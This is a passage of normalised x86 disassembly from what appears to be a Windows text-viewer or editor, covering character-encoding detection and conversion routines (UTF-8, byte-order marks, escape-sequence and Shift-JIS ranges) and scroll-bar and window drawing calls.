jl r-xdata
mov eax [ ebx ]
cmp eax 0xca
jl r-xdata
cmp eax 0xca
jl r-xdata
cmp eax 0xc4
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi ]
cmp eax 0x4a
jl r-xdata
movzx ecx [ ebp * 2 + rw-data ]
mov [ ebx ] ecx
movzx edx [ ebp * 2 + rw-data ]
mov [ edi ] edx
mov eax [ esi + 0x14 ]
add eax 0xfffffffe
jmp r-xdata
mov eax [ ebx ]
cmp eax 0xca
jl r-xdata
cmp eax 0xca
jl r-xdata
cmp eax 0xc4
jle r-xdata
cmp eax 0xce
jg r-xdata
cmp eax 0xb3
jne r-xdata
cmp eax 0xce
jle r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
push ebx
mov ecx edi
call sub_4185c0
add esp 0x4
pop edi
mov eax [ edi ]
cmp eax 0x6e
jl r-xdata
cmp eax 0x6e
jl r-xdata
cmp eax 0x67
jle r-xdata
mov [ esi + 0x14 ] eax
cmp eax 0xce
jg r-xdata
cmp eax 0xb3
jne r-xdata
cmp eax 0xce
jle r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov eax [ ebx ]
cmp eax 0xa1
jl r-xdata
cmp eax 0x7a
jg r-xdata
cmp [ ebx ] 0x83
jne r-xdata
cmp eax 0x7a
jg r-xdata
inc eax
jmp r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
add eax 0x2
cmp eax 0x45
jne r-xdata
mov [ edi ] eax
push ebx
mov ecx edi
mov [ edi ] 0x94
call sub_4185c0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
sub_418e30
push ebx
push ebp
push esi
push edi
mov edi ecx
movsx ebp [ edi + 0x1e ]
mov ebx 0x1
mov [ edi + 0x1e ] 0x2
call sub_4013f0
mov esi eax
cmp esi 0xfeff
jne r-xdata
cmp esi 0xfffe
jne r-xdata
mov [ edi + 0x1e ] bp
pop edi
pop esi
pop ebp
mov eax 0xb
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
mov [ edi + 0x1e ] bp
pop edi
pop esi
pop ebp
mov eax 0x2b
pop ebx
retn
xor eax eax
test ebx ebx
setne al
mov [ edi + 0x1e ] bp
pop edi
pop esi
pop ebp
pop ebx
dec eax
and eax 0xb
retn
lea ecx [ ecx ]
mov [ edi + 0x1e ] bp
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
and esi 0x8080
cmp esi 0x8080
je r-xdata
mov ecx edi
call sub_4013f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor ebx ebx
push 0x0
push esi
call sub_418960
add esp 0x8
test eax eax
je r-xdata
sub_418ed0
push ebx
push ebp
push esi
push edi
mov ebx ecx
mov ebp 0x1
call sub_4013f0
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
test ebp ebp
pop ebp
sete al
pop ebx
retn
mov ecx eax
and ecx 0x80
test cl cl
jne r-xdata
mov edx eax
and edx 0xe0
cmp dl 0xc0
jne r-xdata
xor esi esi
jmp r-xdata
mov ecx eax
and ecx 0xf0
cmp cl 0xe0
jne r-xdata
mov esi 0x1
jmp r-xdata
xor edi edi
test esi esi
jle r-xdata
and eax 0xf8
cmp al 0xf0
jne r-xdata
mov esi 0x2
jmp r-xdata
xor ebp ebp
mov ecx ebx
call sub_4013f0
cmp eax 0xffffffff
jne r-xdata
mov ecx ebx
call sub_4013f0
and eax 0xc0
cmp al 0x80
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi 0x3
inc edi
cmp edi esi
jl r-xdata
sub_418f70
push esi
mov esi ecx
mov al [ esi + 0x22 ]
test al al
je r-xdata
pop esi
retn
push 0x1b
mov [ esi + 0x22 ] 0x0
call sub_401240
cmp [ esi + 0x20 ] 0xa
mov ecx esi
jne r-xdata
push 0x28
call sub_401240
push 0x4a
mov ecx esi
call sub_401240
push 0x48
call sub_401240
pop esi
retn
sub_418fb0
mov eax ecx
mov ecx [ esp + 0x8 ]
add [ eax + 0x28 ] cx
mov edx 0x1
shl edx cl
push esi
mov esi [ esp + 0x8 ]
dec edx
and edx esi
mov esi [ eax + 0x24 ]
shl esi cl
or edx esi
mov [ eax + 0x24 ] edx
pop esi
retn 0x8
sub_418fe0
push esi
mov esi ecx
mov al [ esi + 0x22 ]
test al al
jne r-xdata
pop esi
retn
push 0x1b
mov [ esi + 0x22 ] 0x1
call sub_401240
cmp [ esi + 0x20 ] 0xa
mov ecx esi
jne r-xdata
push 0x24
call sub_401240
cmp [ esi + 0x20 ] 0x9
mov ecx esi
jne r-xdata
push 0x4b
call sub_401240
pop esi
retn
push 0x42
call sub_401240
push 0x40
call sub_401240
pop esi
retn
sub_419030
mov al [ esp + 0x4 ]
mov dl al
and dl 0xf
and al 0x20
movzx dx dl
mov [ ecx + 0x23 ] al
xor eax eax
cmp dx 0xb
sete al
mov [ ecx + 0x20 ] dx
mov [ ecx + 0x22 ] 0x0
mov [ ecx + 0x28 ] 0x0
inc eax
mov [ ecx + 0x1e ] ax
retn 0x4
sub_419090
push esi
push edi
mov esi ecx
mov edi 0x3
call sub_418e30
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov ecx esi
call sub_401320
mov ecx esi
call sub_418ed0
test eax eax
je r-xdata
mov ecx esi
call sub_401320
pop edi
mov eax 0xd
pop esi
retn
mov ecx esi
call sub_4013f0
cmp eax 0xffffffff
je r-xdata
cmp edi 0x3
jne r-xdata
cmp edi 0x14
jne r-xdata
cmp eax 0x1b
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov edi 0x7
cmp eax 0x8e
jne r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0x24
jne r-xdata
cmp eax 0x81
jl r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0xa1
jl r-xdata
cmp eax 0x4b
jne r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0x42
je r-xdata
cmp eax 0xa1
jl r-xdata
cmp eax 0x9f
jle r-xdata
cmp eax 0x7f
je r-xdata
cmp eax 0xdf
jg r-xdata
cmp edi 0x14
je r-xdata
pop edi
mov eax 0xa
pop esi
retn
pop edi
mov eax 0x8
pop esi
retn
cmp eax 0x40
jne r-xdata
cmp eax 0xf0
jl r-xdata
cmp eax 0xdf
jg r-xdata
pop edi
mov eax 0x7
pop esi
retn
cmp eax 0x40
jl r-xdata
mov edi 0x14
jmp r-xdata
pop edi
mov eax 0x9
pop esi
retn
cmp eax 0xe0
jl r-xdata
cmp eax 0xfe
jle r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0xf0
jl r-xdata
cmp eax 0xfc
cmp eax 0xef
jg r-xdata
mov eax 0x6
cmp eax 0xa1
jl r-xdata
cmp eax 0xfe
jle r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0x40
jl r-xdata
cmp eax 0xe0
jl r-xdata
cmp eax 0xdf
jg r-xdata
cmp eax 0x80
jl r-xdata
cmp eax 0x7e
jle r-xdata
cmp eax 0x9f
jmp r-xdata
cmp eax 0xef
jg r-xdata
mov edi 0x14
jmp r-xdata
cmp eax 0xfd
jl r-xdata
cmp eax 0xa0
jle r-xdata
jg r-xdata
cmp eax 0x40
mov edi 0x14
jl r-xdata
cmp eax 0xa1
jl r-xdata
cmp eax 0xfe
jle r-xdata
lea esp [ esp ]
cmp eax 0xfc
jg r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0xffffffff
je r-xdata
cmp eax 0x8d
jle r-xdata
mov edi 0x14
jmp r-xdata
cmp eax 0x40
jge r-xdata
cmp eax 0x8f
jl r-xdata
cmp eax 0x81
jl r-xdata
jmp r-xdata
cmp eax 0xfd
jl r-xdata
cmp eax 0x9f
jle r-xdata
cmp eax 0xfe
jle r-xdata
sub_4192e0
sub esp 0x8
push ebx
push esi
push edi
mov esi ecx
mov ecx esi
call sub_4013f0
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x10 ] ebx
je r-xdata
mov [ esi + 0x1e ] 0x2
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x8
retn
movsx eax [ esi + 0x20 ]
add eax 0xfffffffa
cmp eax 0x28
ja r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
add esp 0x8
retn
movzx eax [ eax + lookup_table_4195e8 ]
jmp [ eax * 4 + jump_table_4195cc ]
cmp ebx 0x1b
jne r-xdata
xor edi edi
mov edx ebx
and edx 0xe0
cmp dl 0xc0
jne r-xdata
mov al [ esi + 0x23 ]
test al al
je r-xdata
cmp ebx 0xa1
jl r-xdata
cmp ebx 0x81
jl r-xdata
cmp ebx 0xa
je r-xdata
mov ecx esi
call sub_4013f0
mov edi eax
cmp edi 0x24
mov [ esp + 0xc ] edi
je r-xdata
cmp ebx 0x2b
jne r-xdata
cmp ebx 0x7f
jg r-xdata
mov eax ebx
and eax 0xf0
cmp al 0xe0
jne r-xdata
mov ecx esi
call sub_4013f0
and ebx 0x1f
shl ebx 0x6
and eax 0x3f
push 0x2223
push ebx
call sub_418960
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x8
retn
xor edx edx
mov dh bl
sar ebx 0x8
or ebx edx
cmp ebx 0x8e
jne r-xdata
cmp ebx 0xfe
jg r-xdata
cmp ebx 0xe0
jl r-xdata
cmp ebx 0x9f
jle r-xdata
mov [ esi + 0x22 ] 0x0
cmp ebx 0xd
je r-xdata
mov ecx esi
call sub_4013f0
cmp edi 0x28
jne r-xdata
mov [ esi + 0x22 ] 0x1
mov edi 0x1
mov [ esi + 0x28 ] 0x0
cmp ebx 0x2b
mov [ esi + 0x22 ] 0x0
je r-xdata
mov al [ ebx + rw-data ]
test al al
jl r-xdata
mov ecx ebx
and ecx 0xf8
cmp cl 0xf0
jne r-xdata
mov ecx esi
call sub_4013f0
mov ecx esi
mov edi eax
call sub_4013f0
and ebx 0xf
shl ebx 0x6
and edi 0x3f
or ebx edi
and eax 0x3f
shl ebx 0x6
jmp r-xdata
mov ecx esi
call sub_4013f0
cmp eax 0xa1
mov [ esp + 0xc ] eax
jl r-xdata
mov ecx esi
call sub_4013f0
shl ebx 0x8
pop edi
or eax ebx
pop esi
and eax 0x7f7f
pop ebx
add esp 0x8
retn
cmp ebx 0xa1
jl r-xdata
cmp ebx 0xef
jg r-xdata
mov ecx esi
call sub_4013f0
mov ecx eax
cmp ecx 0x40
mov [ esp + 0xc ] ecx
jl r-xdata
mov al [ esi + 0x22 ]
test al al
je r-xdata
mov [ esi + 0x22 ] 0x1
jmp r-xdata
cmp edi 0x24
je r-xdata
cmp edi 0x4b
je r-xdata
mov al [ esi + 0x22 ]
test al al
je r-xdata
test edi edi
jne r-xdata
cmp ebx 0x2d
jne r-xdata
movsx ecx al
push 0x6
push ecx
mov ecx esi
call sub_418fb0
xor edi edi
jmp r-xdata
mov ecx esi
call sub_4013f0
mov ecx esi
call sub_4013f0
mov ecx esi
call sub_4013f0
pop edi
pop esi
mov eax 0x2223
pop ebx
add esp 0x8
retn
or ebx eax
cmp eax 0xdf
jg r-xdata
cmp ebx 0xdf
jg r-xdata
mov eax ebx
pop edi
shl eax 0x8
pop esi
or eax ecx
pop ebx
add esp 0x8
retn
cmp ecx 0xfc
jg r-xdata
mov ecx esi
call sub_4013f0
pop edi
shl ebx 0x8
pop esi
or eax ebx
pop ebx
add esp 0x8
retn
cmp [ esi + 0x20 ] 0xb
jne r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
pop edi
pop esi
mov eax 0x2b
pop ebx
add esp 0x8
retn
cmp [ esi + 0x28 ] 0x10
jl r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x10 ]
call sub_4185c0
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
add esp 0x4
mov ecx esi
call sub_4013f0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push 0x2223
push 0x10
mov ecx esi
call sub_418c40
push eax
call sub_418960
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x8
retn
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
mov ecx esi
call sub_418c70
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
pop edi
shl eax 0x8
pop esi
or eax ecx
pop ebx
add esp 0x8
retn
sub_419620
push ebx
push esi
mov esi ecx
movsx eax [ esi + 0x20 ]
add eax 0xfffffffa
cmp eax 0x8
push edi
ja r-xdata
mov eax [ esp + 0x10 ]
test ah 0x7f
je r-xdata
jmp [ eax * 4 + jump_table_419884 ]
push eax
mov ecx esi
call sub_401240
push eax
call sub_4186e0
mov edi eax
add esp 0x4
sar eax 0x8
push eax
mov ecx esi
call sub_401240
and edi 0xff
mov eax [ esp + 0x10 ]
push eax
call sub_418730
mov ebx eax
add esp 0x4
cmp ebx 0x7f
jge r-xdata
mov edx [ esp + 0x10 ]
push edx
call sub_418730
mov edi eax
add esp 0x4
test edi 0xff80
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_418730
add esp 0x4
mov ebx [ esp + 0x10 ]
test bh 0x7f
je r-xdata
mov edi [ esp + 0x10 ]
cmp edi 0xa
je r-xdata
mov al [ esi + 0x22 ]
test al al
mov edi 0x1
jne r-xdata
mov al [ ebx + rw-data ]
test al al
jne r-xdata
push edi
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
test edi 0xf800
jne r-xdata
test bl bl
mov ecx esi
jns r-xdata
mov ecx ebx
or ecx 0x8000
sar ecx 0x8
push ecx
mov ecx esi
call sub_401240
and ebx 0x7f
or ebx 0x80
push ebx
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
mov ecx esi
cmp edi 0xd
je r-xdata
test edi edi
je r-xdata
push 0x2b
mov ecx esi
call sub_401240
cmp ebx 0x2b
jne r-xdata
xor edi edi
jmp r-xdata
mov ecx edi
or ecx 0xe0000
sar ecx 0xc
push ecx
mov ecx esi
call sub_401240
mov edx edi
and edx 0xfc0
or edx 0x2000
sar edx 0x6
push edx
or eax 0x3000
sar eax 0x6
push eax
jmp r-xdata
push ebx
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
push 0x8e
call sub_401240
and ebx 0x7f
push ebx
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
test edi 0x7f00
mov ecx esi
je r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
push 0x10
push ebx
jmp r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x22 ] 0x1
push 0x2d
mov ecx esi
call sub_401240
jmp r-xdata
mov al [ esi + 0x22 ]
test al al
je r-xdata
mov ecx esi
call sub_401240
and edi 0x3f
or edi 0x80
push edi
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
call sub_418f70
push edi
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
call sub_418fe0
mov edx edi
sar edx 0x8
push edx
mov ecx esi
call sub_401240
and edi 0xff
push edi
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
cmp [ esi + 0x28 ] 0x6
jl r-xdata
push 0x6
push 0x0
mov ecx esi
call sub_418fb0
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push 0x6
mov ecx esi
call sub_418c40
movsx ecx [ eax + rw-data ]
push ecx
mov ecx esi
call sub_401240
cmp [ esi + 0x28 ] 0x6
jge r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push ebx
mov ecx esi
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
push 0x2d
mov ecx esi
call sub_401240
push ebx
mov ecx esi
mov [ esi + 0x22 ] 0x0
call sub_401240
pop edi
pop esi
pop ebx
retn 0x4
sub_419930
mov edx [ esp + 0x4 ]
push esi
mov esi [ ecx + 0x14 ]
lea esi [ esi + edx * 2 ]
xor eax eax
cmp [ esi ] 0x2f
je r-xdata
pop esi
retn 0x4
push edi
movsx edi [ ecx + 0x1a ]
mov ecx esi
lea ebx [ ebx ]
pop edi
inc edx
add ecx 0x2
inc eax
cmp [ ecx ] 0x2f
jne r-xdata
cmp edx edi
jge r-xdata
sub_419970
mov eax [ esp + 0x4 ]
push esi
movsx esi [ ecx + 0x1a ]
cmp eax esi
mov edx eax
jge r-xdata
cmp edx esi
pop esi
je r-xdata
mov ecx [ ecx + 0x14 ]
lea ecx [ ecx + eax * 2 ]
retn 0x4
lea eax [ edx + 0x1 ]
inc edx
add ecx 0x2
cmp edx esi
jl r-xdata
cmp [ ecx ] 0x2f
je r-xdata
sub_4199a0
push esi
mov esi ecx
movsx eax [ esi + 0xe ]
mov edx [ esi + 0x28 ]
mov ecx [ esi + 0x24 ]
add eax edx
cmp ecx eax
jge r-xdata
movsx ecx [ esi + 0x1c ]
push ecx
mov ecx esi
call sub_419970
mov [ esi + 0x1c ] ax
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
sub_4199d0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
sub eax 0x2
js r-xdata
retn 0x4
inc eax
retn 0x4
mov ecx [ ecx + 0x14 ]
lea ecx [ ecx + eax * 2 ]
dec eax
sub ecx 0x2
test eax eax
jge r-xdata
cmp [ ecx ] 0x2f
je r-xdata
sub_419a00
mov ax [ ecx + 0x1a ]
cmp ax [ ecx + 0x18 ]
jl r-xdata
mov edx [ ecx + 0x14 ]
movsx eax ax
push esi
mov si [ esp + 0x8 ]
mov [ edx + eax * 2 ] si
inc [ ecx + 0x1a ]
xor eax eax
pop esi
retn 0x4
mov eax 0x1
retn 0x4
sub_419a50
movsx eax [ rw-data ]
push ebp
mov edx ecx
xor ebp ebp
push esi
xor esi esi
cmp [ edx + 0x1c ] bp
push edi
mov [ edx + 0x2c ] eax
mov [ edx + 0x28 ] ebp
mov [ edx + 0x24 ] ebp
jle r-xdata
push ebx
movsx ebx [ edx + 0x1a ]
xor esi esi
cmp ebx ebp
jle r-xdata
mov edi [ edx + 0x14 ]
xor esi esi
cmp [ edx + 0x1e ] bp
jle r-xdata
mov edi [ edx + 0x14 ]
mov edi edi
movzx ecx [ edi ]
mov eax [ edx + 0x28 ]
push ecx
push eax
mov ecx edx
call sub_419900
mov [ edx + 0x28 ] eax
movsx ecx [ edx + 0x1c ]
inc esi
add edi 0x2
cmp esi ecx
jl r-xdata
mov ebp [ edx + 0x2c ]
cmp esi ebx
mov [ edx + 0x34 ] ebp
pop ebx
jge r-xdata
mov edi [ edx + 0x14 ]
lea esp [ esp ]
movzx eax [ edi ]
mov ecx [ edx + 0x24 ]
push eax
push ecx
mov ecx edx
call sub_419900
mov [ edx + 0x24 ] eax
movsx eax [ edx + 0x1a ]
inc esi
add edi 0x2
cmp esi eax
jl r-xdata
mov eax [ edx + 0x28 ]
mov esi [ edx + 0x34 ]
sub ebp eax
or ecx 0xffffffff
sub ecx eax
dec ebp
add esi ecx
mov [ edx + 0x2c ] ebp
mov [ edx + 0x34 ] esi
mov al [ rw-data ]
test al al
pop edi
pop esi
pop ebp
je r-xdata
mov eax [ edx + 0x14 ]
lea edi [ eax + esi * 2 ]
nop
movzx ecx [ edi ]
mov eax [ edx + 0x2c ]
push ecx
push eax
mov ecx edx
call sub_419900
mov [ edx + 0x2c ] eax
movsx ecx [ edx + 0x1e ]
inc esi
add edi 0x2
cmp esi ecx
jl r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
movzx ecx ax
mov eax [ edx + 0x34 ]
push ecx
push eax
mov ecx edx
call sub_419900
mov [ edx + 0x34 ] eax
movsx ecx [ edx + 0x1a ]
inc esi
add edi 0x2
cmp esi ecx
jl r-xdata
mov eax [ edx + 0x8 ]
test eax eax
je r-xdata
mov ax [ edi ]
cmp ax 0x2f
je r-xdata
mov eax [ edx + 0x24 ]
mov [ rw-data ] eax
movsx ecx [ edx + 0xe ]
push 0x1
mov [ rw-data ] ecx
mov eax [ edx + 0x28 ]
push rw-data
mov [ rw-data ] eax
mov ecx [ edx + 0x8 ]
push 0x0
push ecx
call [ SetScrollInfo@IAT ]
sub_419b90
mov eax [ esp + 0x4 ]
sub esp 0x10
test eax eax
push esi
mov esi ecx
je r-xdata
pop esi
add esp 0x10
retn 0x4
lea ecx [ esp + 0x4 ]
push ecx
push eax
call [ GetClientRect@IAT ]
movsx ecx [ rw-data ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
mov [ esi + 0x10 ] dx
xor ecx ecx
mov cx [ rw-data ]
add cx [ rw-data ]
push 0x1
dec ecx
mov [ esi + 0x12 ] cx
movsx eax [ rw-data ]
cdq
and edx 0x3
add edx eax
movsx eax cx
movsx ecx [ rw-data ]
sar edx 0x2
sub eax edx
sub eax ecx
mov cx [ esp + 0x10 ]
mov [ esi + 0x30 ] eax
movsx edx [ rw-data ]
lea eax [ edx + eax + 0x1 ]
mov [ esi + 0xe ] cx
mov ecx esi
mov [ esi + 0x38 ] eax
call sub_419a50
sub_419c40
push esi
push edi
mov edi [ esp + 0xc ]
movzx eax di
cmp eax 0x5
mov esi ecx
ja r-xdata
pop edi
pop esi
retn 0x4
jmp [ eax * 4 + jump_table_419d6c ]
mov ecx esi
call sub_4199a0
jmp r-xdata
movsx eax [ esi + 0x1c ]
push eax
mov ecx esi
call sub_4199d0
mov [ esi + 0x1c ] ax
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
movsx eax [ esi + 0xe ]
mov ecx [ esi + 0x28 ]
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi ecx
cmp ecx edi
jge r-xdata
mov edx [ esi + 0x8 ]
push rw-data
push 0x0
push edx
call [ GetScrollInfo@IAT ]
shr edi 0x10
mov [ rw-data ] edi
push 0x0
mov ecx esi
mov [ esi + 0x1c ] 0x0
call sub_419a50
mov eax [ rw-data ]
cmp eax [ esi + 0x28 ]
jle r-xdata
push 0x1
mov ecx esi
call sub_419a50
mov ecx esi
call sub_419a30
movsx eax [ esi + 0xe ]
mov ecx [ esi + 0x28 ]
cdq
sub eax edx
sar eax 0x1
mov edi ecx
sub edi eax
jns r-xdata
lea ebx [ ebx ]
lea ecx [ ecx ]
cmp ecx edi
jle r-xdata
xor edi edi
push eax
mov ecx esi
call sub_419a50
cmp [ esi + 0x28 ] edi
jl r-xdata
movsx ecx [ esi + 0x1c ]
push ecx
mov ecx esi
call sub_419970
push 0x0
mov ecx esi
mov [ esi + 0x1c ] ax
call sub_419a50
mov edx [ rw-data ]
cmp edx [ esi + 0x28 ]
jg r-xdata
movsx ecx [ esi + 0x1c ]
push ecx
mov ecx esi
call sub_4199d0
push 0x0
mov ecx esi
mov [ esi + 0x1c ] ax
call sub_419a50
cmp [ esi + 0x28 ] edi
jg r-xdata
mov ecx esi
call sub_4199a0
test eax eax
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_419d90
push ecx
push ebx
push ebp
push esi
push edi
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x68
mov esi ecx
call [ SystemParametersInfoA@IAT ]
mov ebx [ rw-data ]
mov ebp eax
mov eax [ esp + 0x18 ]
movzx ecx ax
shr eax 0x10
movsx edx ax
add ebx edx
test cl 0x4
mov [ esp + 0x10 ] ecx
mov [ rw-data ] ebx
jne r-xdata
cmp ebx 0x78
jle r-xdata
cmp ebp 0xffffffff
je r-xdata
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
nop
cmp ebx 0x78
jle r-xdata
push 0x1
mov ecx esi
call sub_419a50
mov ecx esi
call sub_419a30
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
lea ecx [ ecx ]
movsx eax [ esi + 0xe ]
mov ecx [ esi + 0x28 ]
cdq
sub eax edx
sar eax 0x1
mov edi ecx
sub edi eax
jns r-xdata
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
lea ecx [ ebx - 0x79 ]
mov eax 0x88888889
mul ecx
shr edx 0x6
inc edx
mov eax edx
imul eax eax 0xffffff88
add ebx eax
mov [ rw-data ] ebx
jmp r-xdata
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
lea ecx [ ecx ]
cmp ecx edi
jle r-xdata
xor edi edi
lea esp [ esp ]
test ebp ebp
jle r-xdata
movsx eax [ esi + 0xe ]
mov ecx [ esi + 0x28 ]
cdq
sub eax edx
mov edi eax
sar edi 0x1
add ebx 0x78
add edi ecx
cmp ecx edi
mov [ rw-data ] ebx
jge r-xdata
push eax
mov ecx esi
call sub_419a50
cmp [ esi + 0x28 ] edi
mov ebx [ rw-data ]
jl r-xdata
cmp ebx 0x78
jg r-xdata
movsx edx [ esi + 0x1c ]
push edx
mov ecx esi
call sub_4199d0
push 0x0
mov ecx esi
mov [ esi + 0x1c ] ax
call sub_419a50
cmp [ esi + 0x28 ] edi
jg r-xdata
add ebx 0x78
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
mov edi ebp
dec edx
jne r-xdata
mov edi ebp
mov ecx esi
call sub_4199a0
test eax eax
jne r-xdata
sub ebx 0x78
cmp [ esi + 0x1c ] 0x0
mov [ rw-data ] ebx
je r-xdata
mov ebx [ rw-data ]
test ebp ebp
jle r-xdata
mov [ rw-data ] ebx
jmp r-xdata
mov ecx esi
call sub_4199a0
dec edi
jne r-xdata
movsx ecx [ esi + 0x1c ]
push ecx
mov ecx esi
call sub_4199d0
dec edi
mov [ esi + 0x1c ] ax
jne r-xdata
sub_419f30
push esi
mov esi ecx
mov ax [ esi + 0x1a ]
test ax ax
je r-xdata
pop esi
retn 0x4
mov edx [ esi + 0x28 ]
push ebx
push edi
movsx edi [ rw-data ]
sub edi edx
xor ebx ebx
test ax ax
jle r-xdata
mov ecx [ esp + 0x10 ]
add esi 0x2c
push esi
push ecx
call [ InvertRect@IAT ]
pop edi
pop ebx
push ebp
pop ebp
mov ecx [ esi + 0x14 ]
mov ax [ ecx + ebx * 2 ]
cmp ax 0x2f
je r-xdata
mov ecx [ esi + 0x14 ]
movzx edx [ ecx + ebx * 2 ]
push edx
push edi
mov ecx esi
call sub_419900
mov edi eax
movsx eax [ esi + 0x1a ]
inc ebx
cmp ebx eax
jl r-xdata
movsx ebp [ esi + 0x12 ]
mov ecx [ rw-data ]
mov edx [ ecx ]
push ebp
movzx eax ax
push edi
push eax
mov eax [ esp + 0x20 ]
push eax
call [ edx ]
movsx eax [ esi + 0xe ]
cmp edi eax
jge r-xdata
sub_419fd0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp [ esi + 0x1c ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
jle r-xdata
push 0x0
mov ecx esi
call sub_419a50
movsx eax [ esi + 0x10 ]
add eax [ esi + 0x34 ]
movsx ecx [ esi + 0xe ]
cmp eax ecx
jl r-xdata
mov [ esi + 0x1c ] ax
push 0x1
mov ecx esi
call sub_419a50
mov ecx esi
call sub_419a30
pop esi
retn 0x4
movsx edx [ esi + 0x1c ]
mov eax [ esi + 0x14 ]
cmp [ eax + edx * 2 ] 0x2f
je r-xdata
inc [ esi + 0x1c ]
push 0x0
mov ecx esi
call sub_419a50
movsx eax [ esi + 0x10 ]
add eax [ esi + 0x34 ]
movsx ecx [ esi + 0xe ]
cmp eax ecx
jge r-xdata
nop
inc [ esi + 0x1c ]
movsx ecx [ esi + 0x1c ]
mov edx [ esi + 0x14 ]
cmp [ edx + ecx * 2 ] 0x2f
jne r-xdata
sub_41a060
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
lea eax [ edi + edi ]
push eax
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x18 ] 0x0
call sub_429a56
add esp 0x4
test eax eax
mov [ esi + 0x14 ] eax
je r-xdata
mov ecx esi
call sub_419c20
pop edi
mov eax esi
pop esi
retn 0x4
mov [ esi + 0x18 ] di
sub_41a0a0
push ebx
push ebp
push esi
mov esi ecx
mov dx [ esi + 0x1c ]
movsx ebx [ esi + 0x1e ]
movsx ebp [ esi + 0x20 ]
push edi
movzx edi [ esp + 0x14 ]
mov [ esi + 0x1e ] dx
call sub_419fc0
movsx ecx dx
cmp ecx eax
jg r-xdata
push 0x0
mov ecx esi
call sub_419a50
mov [ esi + 0x1e ] bx
mov [ esi + 0x20 ] bp
push 0x0
mov ecx esi
call sub_419a50
cmp edi [ esi + 0x2c ]
jl r-xdata
inc [ esi + 0x1e ]
mov ecx esi
call sub_419fc0
movsx edx [ esi + 0x1e ]
cmp edx eax
jle r-xdata
cmp edi [ esi + 0x34 ]
jle r-xdata
movsx ecx [ esi + 0x1e ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax ]
mov ebp [ esi + 0x2c ]
movsx ecx [ rw-data ]
mov eax edi
sub eax ebp
cdq
idiv ecx
mov ecx [ esi + 0x14 ]
add ax [ esi + 0x1e ]
movsx edx ax
mov [ esi + 0x20 ] ax
cmp [ ecx + edx * 2 ] 0x2f
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
pop edi
dec eax
mov [ esi + 0x20 ] ax
pop esi
pop ebp
pop ebx
retn 0x4
sub_41a150
push esi
push 0xbb8
mov esi ecx
call sub_41a060
xor eax eax
mov [ esi + 0x3e ] ax
mov [ esi + 0x3c ] ax
mov [ esi + 0x44 ] eax
mov [ esi ] r--data
mov [ rw-data ] esi
mov eax esi
pop esi
retn
sub_41a180
push ebx
push esi
push edi
mov edi [ GetDlgItem@IAT ]
push 0x0
mov esi ecx
mov eax [ esi + 0x40 ]
push 0x49f
push eax
call edi
